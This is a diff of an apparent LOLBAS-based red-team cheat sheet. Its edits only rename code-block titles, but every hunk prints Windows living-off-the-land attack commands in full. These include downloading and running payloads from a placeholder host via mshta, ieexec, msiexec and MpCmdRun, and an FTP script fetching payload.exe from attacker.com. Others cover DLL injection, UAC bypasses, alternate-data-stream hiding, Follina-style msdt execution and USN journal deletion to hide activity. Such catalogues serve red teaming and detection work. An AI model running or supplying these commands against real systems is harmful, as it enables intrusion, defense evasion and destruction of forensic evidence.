 forfiles /p c:\windows\system32 /m notepad.exe /c "$file_out:evil.exe"
 ```
 <!-- cheat
@@ -1547,7 +1547,7 @@ Zero out a file
 
 *Privileges: User • MITRE: T1485*
 
-```cmd title:"Zero out a file"
+```cmd title:"Lolbas Zero out a file"
 fsutil.exe file setZeroData offset=0 length=9999999999 $file_out
 ```
 <!-- cheat
@@ -1560,7 +1560,7 @@ Delete the USN journal volume to hide file creation activity
 
 *Privileges: User • MITRE: T1485*
 
-```cmd title:"Delete the USN journal volume to hide file creation activity"
+```cmd title:"Lolbas Delete the USN journal volume to hide file creation activity"
 fsutil.exe usn deletejournal /d c:
 ```
 <!-- cheat
@@ -1572,7 +1572,7 @@ Executes a pre-planted binary named netsh.exe from the current directory.
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"Executes a pre-planted binary named netsh.exe from the current directory"
+```cmd title:"Lolbas Executes a pre-planted binary named netsh.exe from the current directory"
 fsutil.exe trace decode
 ```
 <!-- cheat
@@ -1592,7 +1592,7 @@ Executes the commands you put inside the text file.
 
 *Privileges: User • MITRE: T1202*
 
-```cmd title:"Executes the commands you put inside the text file"
+```cmd title:"Lolbas Executes the commands you put inside the text file"
 echo !$cmd > ftpcommands.txt && ftp -s:ftpcommands.txt
 ```
 <!-- cheat
@@ -1605,7 +1605,7 @@ Download
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"Download"
+```cmd title:"Lolbas Download"
 cmd.exe /c "@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v"
 ```
 <!-- cheat
@@ -1625,7 +1625,7 @@ Executes logon scripts configured in Group Policy.
 
 *Privileges: Administrator • MITRE: T1218*
 
-```cmd title:"Executes logon scripts configured in Group Policy"
+```cmd title:"Lolbas Executes logon scripts configured in Group Policy"
 Gpscript /logon
 ```
 <!-- cheat
@@ -1637,7 +1637,7 @@ Executes startup scripts configured in Group Policy
 
 *Privileges: Administrator • MITRE: T1218*
 
-```cmd title:"Executes startup scripts configured in Group Policy"
+```cmd title:"Lolbas Executes startup scripts configured in Group Policy"
 Gpscript /startup
 ```
 <!-- cheat
@@ -1657,7 +1657,7 @@ Open the target batch script with HTML Help.
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"Open the target batch script with HTML Help"
+```cmd title:"Lolbas Open the target batch script with HTML Help"
 HH.exe $scheme://$lhost:$lport/$file
 ```
 <!-- cheat
@@ -1673,7 +1673,7 @@ Executes specified executable with HTML Help.
 
 *Privileges: User • MITRE: T1218.001*
 
-```cmd title:"Executes specified executable with HTML Help"
+```cmd title:"Lolbas Executes specified executable with HTML Help"
 HH.exe $file_out
 ```
 <!-- cheat
@@ -1686,7 +1686,7 @@ Executes a remote .chm file which can contain commands.
 
 *Privileges: User • MITRE: T1218.001*
 
-```cmd title:"Executes a remote .chm file which can contain commands"
+```cmd title:"Lolbas Executes a remote .chm file which can contain commands"
 HH.exe $scheme://$lhost:$lport/$file
 ```
 <!-- cheat
@@ -1712,7 +1712,7 @@ Executes commands from a specially prepared ie4uinit.inf file.
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"Executes commands from a specially prepared ie4uinit.inf file"
+```cmd title:"Lolbas Executes commands from a specially prepared ie4uinit.inf file"
 ie4uinit.exe -BaseSettings
 ```
 <!-- cheat
@@ -1731,7 +1731,7 @@ Executes binary that is pre-planted at C:\test\system32\netsh.exe.
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"Executes binary that is pre-planted at C:\test\system32\netsh.exe"
+```cmd title:"Lolbas Executes binary that is pre-planted at C:\test\system32\netsh.exe"
 set windir=c:\test& cd "C:\Program Files\Internet Explorer\" & iediagcmd.exe /out:$file_out
 ```
 <!-- cheat
@@ -1752,7 +1752,7 @@ Downloads and executes executable from the remote server.
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"Downloads and executes executable from the remote server"
+```cmd title:"Lolbas Downloads and executes executable from the remote server"
 ieexec.exe $scheme://$lhost:$lport/$file
 ```
 <!-- cheat
@@ -1768,7 +1768,7 @@ Downloads and executes executable from the remote server.
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"Downloads and executes executable from the remote server"
+```cmd title:"Lolbas Downloads and executes executable from the remote server"
 ieexec.exe $scheme://$lhost:$lport/$file
 ```
 <!-- cheat
@@ -1792,7 +1792,7 @@ Binary file used by .NET to compile C#/intermediate (IL) code to .exe
 
 *Privileges: User • MITRE: T1127*
 
-```cmd title:"Binary file used by .NET to compile C#/intermediate (IL) code to .exe"
+```cmd title:"Lolbas Binary file used by .NET to compile C#/intermediate (IL) code to .exe"
 ilasm.exe $file_out /exe
 ```
 <!-- cheat
@@ -1805,7 +1805,7 @@ Binary file used by .NET to compile C#/intermediate (IL) code to dll
 
 *Privileges: User • MITRE: T1127*
 
-```cmd title:"Binary file used by .NET to compile C#/intermediate (IL) code to dll"
+```cmd title:"Lolbas Binary file used by .NET to compile C#/intermediate (IL) code to dll"
 ilasm.exe $file_out /dll
 ```
 <!-- cheat
@@ -1825,7 +1825,7 @@ IMEWDBLD.exe attempts to load a dictionary file, if provided a URL as an argumen
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"IMEWDBLD.exe attempts to load a dictionary file, if provided a URL as an argument, it will download…"
+```cmd title:"Lolbas IMEWDBLD.exe Download"
 C:\Windows\System32\IME\SHARED\IMEWDBLD.exe $scheme://$lhost:$lport/$file
 ```
 <!-- cheat
@@ -1849,7 +1849,7 @@ Executes SCT script using scrobj.dll from a command in entered into a specially 
 
 *Privileges: Admin • MITRE: T1218*
 
-```cmd title:"Executes SCT script using scrobj.dll from a command in entered into a specially prepared INF file"
+```cmd title:"Lolbas Executes SCT script using scrobj.dll from a command in entered into a specially prepared INF file"
 InfDefaultInstall.exe $file_out
 ```
 <!-- cheat
@@ -1872,7 +1872,7 @@ Execute the target .NET DLL or EXE.
 
 *Privileges: User • MITRE: T1218.004*
 
-```cmd title:"Execute the target .NET DLL or EXE"
+```cmd title:"Lolbas Execute the target .NET DLL or EXE"
 InstallUtil.exe /logfile= /LogToConsole=false /U $file_out
 ```
 <!-- cheat
@@ -1885,7 +1885,7 @@ Execute the target .NET DLL or EXE.
 
 *Privileges: User • MITRE: T1218.004*
 
-```cmd title:"Execute the target .NET DLL or EXE"
+```cmd title:"Lolbas Execute the target .NET DLL or EXE"
 InstallUtil.exe /logfile= /LogToConsole=false /U $file_out
 ```
 <!-- cheat
@@ -1898,7 +1898,7 @@ It will download a remote payload and place it in INetCache.
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"It will download a remote payload and place it in INetCache"
+```cmd title:"Lolbas It will download a remote payload and place it in INetCache"
 InstallUtil.exe $scheme://$lhost:$lport/$file
 ```
 <!-- cheat
@@ -1922,7 +1922,7 @@ c:\windows\syswow64\iscsicpl.exe has a DLL injection through `C:\Users\<username
 
 *Privileges: User • MITRE: T1548.002*
 
-```cmd title:"c:\windows\syswow64\iscsicpl.exe has a DLL injection through…"
+```cmd title:"Lolbas iscsicpl.exe UAC Bypass #1"
 c:\windows\syswow64\iscsicpl.exe
 ```
 <!-- cheat
@@ -1934,7 +1934,7 @@ Both `c:\windows\system32\iscsicpl.exe` and `c:\windows\system64\iscsicpl.exe` h
 
 *Privileges: User • MITRE: T1548.002*
 
-```cmd title:"Both c:\windows\system32\iscsicpl.exe and c:\windows\system64\iscsicpl.exe have UAC bypass through…"
+```cmd title:"Lolbas iscsicpl.exe UAC Bypass #2"
 iscsicpl.exe
 ```
 <!-- cheat
@@ -1956,7 +1956,7 @@ Use jsc.exe to compile JavaScript code stored in the provided .JS file and gener
 
 *Privileges: User • MITRE: T1127*
 
-```cmd title:"Use jsc.exe to compile JavaScript code stored in the provided .JS file and generate a .EXE file…"
+```cmd title:"Lolbas Jsc.exe Compile #1"
 jsc.exe $file_out
 ```
 <!-- cheat
@@ -1969,7 +1969,7 @@ Use jsc.exe to compile JavaScript code stored in the .JS file and generate a DLL
 
 *Privileges: User • MITRE: T1127*
 
-```cmd title:"Use jsc.exe to compile JavaScript code stored in the .JS file and generate a DLL file with the same…"
+```cmd title:"Lolbas Jsc.exe Compile #2"
 jsc.exe /t:library $file_out
 ```
 <!-- cheat
@@ -1990,7 +1990,7 @@ Import specified .ldf file into LDAP. If the file contains http-based attrval-sp
 
 *Privileges: Administrator • MITRE: T1105*
 
-```cmd title:"Import specified .ldf file into LDAP"
+```cmd title:"Lolbas Import specified .ldf file into LDAP"
 Ldifde -i -f $file_out
 ```
 <!-- cheat
@@ -2011,7 +2011,7 @@ Compresses the target file into a CAB file stored in the Alternate Data Stream (
 
 *Privileges: User • MITRE: T1564.004*
 
-```cmd title:"Compresses the target file into a CAB file stored in the Alternate Data Stream (ADS) of the target…"
+```cmd title:"Lolbas Makecab.exe ADS #1"
 makecab $file_out $file_out:autoruns.cab
 ```
 <!-- cheat
@@ -2024,7 +2024,7 @@ Compresses the target file into a CAB file stored in the Alternate Data Stream (
 
 *Privileges: User • MITRE: T1564.004*
 
-```cmd title:"Compresses the target file into a CAB file stored in the Alternate Data Stream (ADS) of the target…"
+```cmd title:"Lolbas Makecab.exe ADS #2"
 makecab \\$lhost\$share\$file $file_out:file.cab
 ```
 <!-- cheat
@@ -2040,7 +2040,7 @@ Download and compresses the target file and stores it in the target file.
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"Download and compresses the target file and stores it in the target file"
+```cmd title:"Lolbas Download and compresses the target file and stores it in the target file"
 makecab \\$lhost\$share\$file $file_out
 ```
 <!-- cheat
@@ -2056,7 +2056,7 @@ Execute makecab commands as defined in the specified Diamond Definition File (.d
 
 *Privileges: User • MITRE: T1036*
 
-```cmd title:"Execute makecab commands as defined in the specified Diamond Definition File (.ddf); see resources…"
+```cmd title:"Lolbas Makecab.exe Execute #4"
 makecab /F $file_out
 ```
 <!-- cheat
@@ -2077,7 +2077,7 @@ Inject evil.dll into a process with PID 3110.
 
 *Privileges: User • MITRE: T1218.013*
 
-```cmd title:"Inject evil.dll into a process with PID 3110"
+```cmd title:"Lolbas Inject evil.dll into a process with PID 3110"
 MavInject.exe 3110 /INJECTRUNNING $file_out
 ```
 <!-- cheat
@@ -2090,7 +2090,7 @@ Inject file.dll stored as an Alternate Data Stream (ADS) into a process with PID
 
 *Privileges: User • MITRE: T1564.004*
 
-```cmd title:"Inject file.dll stored as an Alternate Data Stream (ADS) into a process with PID 4172"
+```cmd title:"Lolbas Inject file.dll stored as an Alternate Data Stream (ADS) into a process with PID 4172"
 Mavinject.exe 4172 /INJECTRUNNING $file_out:file.dll
 ```
 <!-- cheat
@@ -2110,7 +2110,7 @@ Compile and execute C# or VB.net code in a XOML file referenced in the first arg
 
 *Privileges: User • MITRE: T1127*
 
-```cmd title:"Compile and execute C# or VB.net code in a XOML file referenced in the first argument (any…"
+```cmd title:"Lolbas Compile and execute XOML workflow code"
 Microsoft.Workflow.Compiler.exe $file_out $file_out
 ```
 <!-- cheat
@@ -2123,7 +2123,7 @@ Compile and execute C# or VB.net code in a XOML file referenced in the test.txt 
 
 *Privileges: User • MITRE: T1127*
 
-```cmd title:"Compile and execute C# or VB.net code in a XOML file referenced in the test.txt file"
+```cmd title:"Lolbas Compile and execute C# or VB.net code in a XOML file referenced in the test.txt file"
 Microsoft.Workflow.Compiler.exe $file_out $file_out
 ```
 <!-- cheat
@@ -2136,7 +2136,7 @@ Compile and execute C# or VB.net code in a XOML file referenced in the test.txt 
 
 *Privileges: User • MITRE: T1127*
 
-```cmd title:"Compile and execute C# or VB.net code in a XOML file referenced in the test.txt file"
+```cmd title:"Lolbas Compile and execute C# or VB.net code in a XOML file referenced in the test.txt file"
 Microsoft.Workflow.Compiler.exe $file_out $file_out
 ```
 <!-- cheat
@@ -2157,7 +2157,7 @@ Launch a 'backgrounded' MMC process and invoke a COM payload
 
 *Privileges: User • MITRE: T1218.014*
 
-```cmd title:"Launch a 'backgrounded' MMC process and invoke a COM payload"
+```cmd title:"Lolbas Launch a 'backgrounded' MMC process and invoke a COM payload"
 mmc.exe -Embedding $file_out
 ```
 <!-- cheat
@@ -2170,7 +2170,7 @@ Load an arbitrary payload DLL by configuring COR Profiler registry settings and 
 
 *Privileges: Administrator • MITRE: T1218.014*
 
-```cmd title:"Load an arbitrary payload DLL by configuring COR Profiler registry settings and launching MMC to…"
+```cmd title:"Lolbas Mmc.exe UAC Bypass #2"
 mmc.exe gpedit.msc
 ```
 <!-- cheat
@@ -2182,7 +2182,7 @@ Download and save an executable to disk
 
 *Privileges: User • MITRE: T1218.014*
 
-```cmd title:"Download and save an executable to disk"
+```cmd title:"Lolbas Download and save an executable to disk"
 mmc.exe -Embedding $file_out
 ```
 <!-- cheat
@@ -2207,7 +2207,7 @@ Download file to specified path - Slashes work as well as dashes (/DownloadFile,
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"Download file to specified path - Slashes work as well as dashes (/DownloadFile, /url, /path)"
+```cmd title:"Lolbas Download file to specified path - Slashes work as well as dashes (/DownloadFile, /url, /path)"
 MpCmdRun.exe -DownloadFile -url $scheme://$lhost:$lport/$file -path $file_out
 ```
 <!-- cheat
@@ -2224,7 +2224,7 @@ Download file to specified path. Slashes work as well as dashes (/DownloadFile, 
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"Download file to specified path"
+```cmd title:"Lolbas Download file to specified path"
 copy "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" $file_in && chdir "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\" && "$file_in" -DownloadFile -url $scheme://$lhost:$lport/$file -path $file_in
 ```
 <!-- cheat
@@ -2241,7 +2241,7 @@ Download file to machine and store it in Alternate Data Stream
 
 *Privileges: User • MITRE: T1564.004*
 
-```cmd title:"Download file to machine and store it in Alternate Data Stream"
+```cmd title:"Lolbas Download file to machine and store it in Alternate Data Stream"
 MpCmdRun.exe -DownloadFile -url $scheme://$lhost:$lport/$file -path $file_out:evil.exe
 ```
 <!-- cheat
@@ -2271,7 +2271,7 @@ Build and execute a C# project stored in the target XML file.
 
 *Privileges: User • MITRE: T1127.001*
 
-```cmd title:"Build and execute a C# project stored in the target XML file"
+```cmd title:"Lolbas Build and execute a C# project stored in the target XML file"
 msbuild.exe $file_out
 ```
 <!-- cheat
@@ -2284,7 +2284,7 @@ Build and execute a C# project stored in the target csproj file.
 
 *Privileges: User • MITRE: T1127.001*
 
-```cmd title:"Build and execute a C# project stored in the target csproj file"
+```cmd title:"Lolbas Build and execute a C# project stored in the target csproj file"
 msbuild.exe $file_out
 ```
 <!-- cheat
@@ -2297,7 +2297,7 @@ Executes generated Logger DLL file with TargetLogger export.
 
 *Privileges: User • MITRE: T1127.001*
 
-```cmd title:"Executes generated Logger DLL file with TargetLogger export"
+```cmd title:"Lolbas Executes generated Logger DLL file with TargetLogger export"
 msbuild.exe /logger:TargetLogger,$file_out;MyParameters,Foo
 ```
 <!-- cheat
@@ -2310,7 +2310,7 @@ Execute JScript/VBScript code through XML/XSL Transformation. Requires Visual St
 
 *Privileges: User • MITRE: T1127.001*
 
-```cmd title:"Execute JScript/VBScript code through XML/XSL Transformation. Requires Visual Studio MSBuild v14.0+"
+```cmd title:"Lolbas Execute JScript/VBScript code through XML/XSL Transformation. Requires Visual Studio MSBuild v14.0+"
 msbuild.exe $file_out
 ```
 <!-- cheat
@@ -2323,7 +2323,7 @@ By putting any valid msbuild.exe command-line options in an RSP file and calling
 
 *Privileges: User • MITRE: T1036*
 
-```cmd title:"By putting any valid msbuild.exe command-line options in an RSP file and calling it as above will…"
+```cmd title:"Lolbas Msbuild.exe Execute #5"
 msbuild.exe @$file_out
 ```
 <!-- cheat
@@ -2343,7 +2343,7 @@ Executes command embeded in crafted c:\windows\system32\mscfgtlc.xml.
 
 *Privileges: Administrator • MITRE: T1218*
 
-```cmd title:"Executes command embeded in crafted c:\windows\system32\mscfgtlc.xml"
+```cmd title:"Lolbas Executes command embeded in crafted c:\windows\system32\mscfgtlc.xml"
 Msconfig.exe -5
 ```
 <!-- cheat
@@ -2363,7 +2363,7 @@ Executes the Microsoft Diagnostics Tool and executes the malicious .MSI referenc
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"Executes the Microsoft Diagnostics Tool and executes the malicious .MSI referenced in the .xml file"
+```cmd title:"Lolbas Executes the Microsoft Diagnostics Tool and executes the malicious .MSI referenced in the .xml file"
 msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af $file_out /skip TRUE
 ```
 <!-- cheat
@@ -2376,7 +2376,7 @@ Executes the Microsoft Diagnostics Tool and executes the malicious .MSI referenc
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"Executes the Microsoft Diagnostics Tool and executes the malicious .MSI referenced in the .xml file"
+```cmd title:"Lolbas Executes the Microsoft Diagnostics Tool and executes the malicious .MSI referenced in the .xml file"
 msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af $file_out /skip TRUE
 ```
 <!-- cheat
@@ -2389,7 +2389,7 @@ Executes arbitrary commands using the Microsoft Diagnostics Tool and leveraging 
 
 *Privileges: User • MITRE: T1202*
 
-```cmd title:"Executes arbitrary commands using the Microsoft Diagnostics Tool and leveraging the 'PCWDiagnostic'…"
+```cmd title:"Lolbas Msdt.exe AWL Bypass #3"
 msdt.exe /id PCWDiagnostic /skip force /param "IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc).exe"
 ```
 <!-- cheat
@@ -2409,7 +2409,7 @@ Edge will launch and download the file. A 'harmless' file extension (e.g. .txt, 
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"Edge will launch and download the file"
+```cmd title:"Lolbas Edge will launch and download the file"
 msedge.exe $scheme://$lhost:$lport/$file
 ```
 <!-- cheat
@@ -2425,7 +2425,7 @@ Edge will silently download the file. File extension should be .html and binarie
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"Edge will silently download the file. File extension should be .html and binaries should be encoded"
+```cmd title:"Lolbas Edge will silently download the file. File extension should be .html and binaries should be encoded"
 msedge.exe --headless --enable-logging --disable-gpu --dump-dom "$scheme://$lhost:$lport/$file" > $file_out
 ```
 <!-- cheat
@@ -2442,7 +2442,7 @@ Edge spawns cmd.exe as a child process of msedge.exe and executes the specified 
 
 *Privileges: User • MITRE: T1218.015*
 
-```cmd title:"Edge spawns cmd.exe as a child process of msedge.exe and executes the specified command"
+```cmd title:"Lolbas Edge spawns cmd.exe as a child process of msedge.exe and executes the specified command"
 msedge.exe --disable-gpu-sandbox --gpu-launcher="$cmd &&"
 ```
 <!-- cheat
@@ -2462,7 +2462,7 @@ msedge_proxy will download malicious file.
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"msedge_proxy will download malicious file"
+```cmd title:"Lolbas msedge_proxy will download malicious file"
 C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe $scheme://$lhost:$lport/$file
 ```
 <!-- cheat
@@ -2478,7 +2478,7 @@ msedge_proxy.exe will execute file in the background
 
 *Privileges: User • MITRE: T1218.015*
 
-```cmd title:"msedge_proxy.exe will execute file in the background"
+```cmd title:"Lolbas msedge_proxy.exe will execute file in the background"
 C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe --disable-gpu-sandbox --gpu-launcher="$cmd &&"
 ```
 <!-- cheat
@@ -2499,7 +2499,7 @@ This command launches the Microsoft Edge WebView2 browser control without sandbo
 
 *Privileges: Low privileges • MITRE: T1218.015*
 
-```cmd title:"This command launches the Microsoft Edge WebView2 browser control without sandboxing and will spawn…"
+```cmd title:"Lolbas msedgewebview2.exe Execute #1"
 msedgewebview2.exe --no-sandbox --browser-subprocess-path="$file_out"
 ```
 <!-- cheat
@@ -2512,7 +2512,7 @@ This command launches the Microsoft Edge WebView2 browser control without sandbo
 
 *Privileges: User • MITRE: T1218.015*
 
-```cmd title:"This command launches the Microsoft Edge WebView2 browser control without sandboxing and will spawn…"
+```cmd title:"Lolbas msedgewebview2.exe Execute #2"
 msedgewebview2.exe --utility-cmd-prefix="$cmd"
 ```
 <!-- cheat
@@ -2525,7 +2525,7 @@ This command launches the Microsoft Edge WebView2 browser control without sandbo
 
 *Privileges: User • MITRE: T1218.015*
 
-```cmd title:"This command launches the Microsoft Edge WebView2 browser control without sandboxing and will spawn…"
+```cmd title:"Lolbas msedgewebview2.exe Execute #3"
 msedgewebview2.exe --disable-gpu-sandbox --gpu-launcher="$cmd"
 ```
 <!-- cheat
@@ -2538,7 +2538,7 @@ This command launches the Microsoft Edge WebView2 browser control without sandbo
 
 *Privileges: User • MITRE: T1218.015*
 
-```cmd title:"This command launches the Microsoft Edge WebView2 browser control without sandboxing and will spawn…"
+```cmd title:"Lolbas msedgewebview2.exe Execute #4"
 msedgewebview2.exe --no-sandbox --renderer-cmd-prefix="$cmd"
 ```
 <!-- cheat
@@ -2559,7 +2559,7 @@ Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript.
 
 *Privileges: User • MITRE: T1218.005*
 
-```cmd title:"Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript"
+```cmd title:"Lolbas Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript"
 mshta.exe $file_out
 ```
 <!-- cheat
@@ -2572,7 +2572,7 @@ Executes VBScript supplied as a command line argument.
 
 *Privileges: User • MITRE: T1218.005*
 
-```cmd title:"Executes VBScript supplied as a command line argument"
+```cmd title:"Lolbas Executes VBScript supplied as a command line argument"
 mshta.exe vbscript:Close(Execute("GetObject(""script:$scheme://$lhost:$lport/$file"")"))
 ```
 <!-- cheat
@@ -2588,7 +2588,7 @@ Executes JavaScript supplied as a command line argument.
 
 *Privileges: User • MITRE: T1218.005*
 
-```cmd title:"Executes JavaScript supplied as a command line argument"
+```cmd title:"Lolbas Executes JavaScript supplied as a command line argument"
 mshta.exe javascript:a=GetObject("script:$scheme://$lhost:$lport/$file").Exec();close();
 ```
 <!-- cheat
@@ -2604,7 +2604,7 @@ Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript.
 
 *Privileges: User • MITRE: T1218.005*
 
-```cmd title:"Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript"
+```cmd title:"Lolbas Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript"
 mshta.exe "$file_out:file.hta"
 ```
 <!-- cheat
@@ -2617,7 +2617,7 @@ It will download a remote payload and place it in INetCache.
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"It will download a remote payload and place it in INetCache"
+```cmd title:"Lolbas It will download a remote payload and place it in INetCache"
 mshta.exe $scheme://$lhost:$lport/$file
 ```
 <!-- cheat
@@ -2641,7 +2641,7 @@ Installs the target .MSI file silently.
 
 *Privileges: User • MITRE: T1218.007*
 
-```cmd title:"Installs the target .MSI file silently"
+```cmd title:"Lolbas Installs the target .MSI file silently"
 msiexec /quiet /i $file_out
 ```
 <!-- cheat
@@ -2654,7 +2654,7 @@ Installs the target remote & renamed .MSI file silently.
 
 *Privileges: User • MITRE: T1218.007*
 
-```cmd title:"Installs the target remote & renamed .MSI file silently"
+```cmd title:"Lolbas Installs the target remote & renamed .MSI file silently"
 msiexec /q /i $scheme://$lhost:$lport/$file
 ```
 <!-- cheat
@@ -2670,7 +2670,7 @@ Calls DllRegisterServer to register the target DLL.
 
 *Privileges: User • MITRE: T1218.007*
 
-```cmd title:"Calls DllRegisterServer to register the target DLL"
+```cmd title:"Lolbas Calls DllRegisterServer to register the target DLL"
 msiexec /y $file_out
 ```
 <!-- cheat
@@ -2683,7 +2683,7 @@ Calls DllUnregisterServer to un-register the target DLL.
 
 *Privileges: User • MITRE: T1218.007*
 
-```cmd title:"Calls DllUnregisterServer to un-register the target DLL"
+```cmd title:"Lolbas Calls DllUnregisterServer to un-register the target DLL"
 msiexec /z $file_out
 ```
 <!-- cheat
@@ -2696,7 +2696,7 @@ Installs the target .MSI file from a remote URL, the file can be signed by vendo
 
 *Privileges: User • MITRE: T1218.007*
 
-```cmd title:"Installs the target .MSI file from a remote URL, the file can be signed by vendor"
+```cmd title:"Lolbas Installs the target .MSI file from a remote URL, the file can be signed by vendor"
 msiexec /i $file_out TRANSFORMS="$scheme://$lhost:$lport/$file" /qb
 ```
 <!-- cheat
@@ -2721,7 +2721,7 @@ Use Netsh in order to execute a .dll file and also gain persistence, every time 
 
 *Privileges: Admin • MITRE: T1546.007*
 
-```cmd title:"Use Netsh in order to execute a .dll file and also gain persistence, every time the netsh command…"
+```cmd title:"Lolbas Netsh.exe Execute"
 netsh.exe add helper $file_out
 ```
 <!-- cheat
@@ -2744,7 +2744,7 @@ Downloads payload from remote server using the Microsoft Native Image Generator 
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"Downloads payload from remote server using the Microsoft Native Image Generator utility"
+```cmd title:"Lolbas Downloads payload from remote server using the Microsoft Native Image Generator utility"
 ngen.exe $scheme://$lhost:$lport/$file
 ```
 <!-- cheat
@@ -2768,7 +2768,7 @@ Launch odbcad32.exe GUI, click 'Tracing' tab, click 'Browsing' button, enter abi
 
 *Privileges: User • MITRE: T1548.002*
 
-```cmd title:"Launch odbcad32.exe GUI, click 'Tracing' tab, click 'Browsing' button, enter abitrary command in…"
+```cmd title:"Lolbas odbcad32.exe UAC Bypass"
 odbcad32.exe
 ```
 <!-- cheat
@@ -2788,7 +2788,7 @@ Execute DllRegisterServer from DLL specified.
 
 *Privileges: User • MITRE: T1218.008*
 
-```cmd title:"Execute DllRegisterServer from DLL specified"
+```cmd title:"Lolbas Execute DllRegisterServer from DLL specified"
 odbcconf /a $regsvr_file_out
 ```
 <!-- cheat
@@ -2802,7 +2802,7 @@ Install a driver and load the DLL. Requires administrator privileges.
 
 *Privileges: User • MITRE: T1218.008*
 
-```cmd title:"Install a driver and load the DLL. Requires administrator privileges"
+```cmd title:"Lolbas Install a driver and load the DLL. Requires administrator privileges"
 odbcconf INSTALLDRIVER "lolbas-project|Driver=$file_out|APILevel=2"
 odbcconf configsysdsn "lolbas-project" "DSN=lolbas-project"
 ```
@@ -2816,7 +2816,7 @@ Load DLL specified in target .RSP file. See the Code Sample section for an examp
 
 *Privileges: Administrator • MITRE: T1218.008*
 
-```cmd title:"Load DLL specified in target .RSP file. See the Code Sample section for an example .RSP file"
+```cmd title:"Lolbas Load DLL specified in target .RSP file. See the Code Sample section for an example .RSP file"
 odbcconf -f $file_out
 ```
 <!-- cheat
@@ -2836,7 +2836,7 @@ Execute mpclient.dll library in the current working directory
 
 *Privileges: Administrator • MITRE: T1218*
 
-```cmd title:"Execute mpclient.dll library in the current working directory"
+```cmd title:"Lolbas Execute mpclient.dll library in the current working directory"
 OfflineScannerShell
 ```
 <!-- cheat
@@ -2857,7 +2857,7 @@ Download a file from the web address specified in `HKCU\Software\Microsoft\OneDr
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"Download a file from the web address specified in…"
+```cmd title:"Lolbas OneDriveStandaloneUpdater.exe Download"
 reg add "HKCU\Software\Microsoft\OneDrive\UpdateOfficeConfig\UpdateRingSettingURLFromOC" /ve /d "$file_in" /f
 OneDriveStandaloneUpdater
 ```
@@ -2878,7 +2878,7 @@ Open the target .EXE using the Program Compatibility Assistant.
 
 *Privileges: User • MITRE: T1202*
 
-```cmd title:"Open the target .EXE using the Program Compatibility Assistant"
+```cmd title:"Lolbas Open the target .EXE using the Program Compatibility Assistant"
 pcalua.exe -a $file_out
 ```
 <!-- cheat
@@ -2891,7 +2891,7 @@ Open the target .DLL file with the Program Compatibilty Assistant.
 
 *Privileges: User • MITRE: T1202*
 
-```cmd title:"Open the target .DLL file with the Program Compatibilty Assistant"
+```cmd title:"Lolbas Open the target .DLL file with the Program Compatibilty Assistant"
 pcalua.exe -a \\$lhost\$share\$file
 ```
 <!-- cheat
@@ -2906,7 +2906,7 @@ Open the target .CPL file with the Program Compatibility Assistant.
 
 *Privileges: User • MITRE: T1202*
 
-```cmd title:"Open the target .CPL file with the Program Compatibility Assistant"
+```cmd title:"Lolbas Open the target .CPL file with the Program Compatibility Assistant"
 pcalua.exe -a $file_out -c Java
 ```
 <!-- cheat
@@ -2926,7 +2926,7 @@ Open the target .EXE file with the Program Compatibility Wizard.
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"Open the target .EXE file with the Program Compatibility Wizard"
+```cmd title:"Lolbas Open the target .EXE file with the Program Compatibility Wizard"
 Pcwrun.exe $file_out
 ```
 <!-- cheat
@@ -2939,7 +2939,7 @@ Leverage the MSDT follina vulnerability through Pcwrun to execute arbitrary comm
 
 *Privileges: User • MITRE: T1202*
 
-```cmd title:"Leverage the MSDT follina vulnerability through Pcwrun to execute arbitrary commands and binaries"
+```cmd title:"Lolbas Leverage the MSDT follina vulnerability through Pcwrun to execute arbitrary commands and binaries"
 Pcwrun.exe /../../$(calc).exe
 ```
 <!-- cheat
@@ -2959,7 +2959,7 @@ Will start a packet capture and store log file as PktMon.etl. Use pktmon.exe sto
 
 *Privileges: Administrator • MITRE: T1040*
 
-```cmd title:"Will start a packet capture and store log file as PktMon.etl. Use pktmon.exe stop"
+```cmd title:"Lolbas Will start a packet capture and store log file as PktMon.etl. Use pktmon.exe stop"
 pktmon.exe start --etw
 ```
 <!-- cheat
@@ -2971,7 +2971,7 @@ Select Desired ports for packet capture
 
 *Privileges: Administrator • MITRE: T1040*
 
-```cmd title:"Select Desired ports for packet capture"
+```cmd title:"Lolbas Select Desired ports for packet capture"
 pktmon.exe filter add -p 445
 ```
 <!-- cheat
@@ -2990,7 +2990,7 @@ Used for installing drivers
 
